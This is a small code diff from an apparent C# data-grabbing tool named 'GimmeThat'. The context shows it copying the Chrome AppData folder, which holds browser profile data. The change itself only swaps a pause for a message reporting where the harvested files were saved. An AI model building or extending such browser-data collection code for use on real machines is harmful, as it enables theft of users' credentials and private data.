@@ -42,7 +42,7 @@ namespace GimmeThat
             if (google)
                 copyFolder(@"AppData\Local\Google", getDirectories()); //it will get the chrome folder
 
-            Console.ReadLine();
+            Console.WriteLine("[+] Program execution finished. Files and folders saved in: " + Directory.GetCurrentDirectory() + "\\files");
         }
         public static void banner()
         {
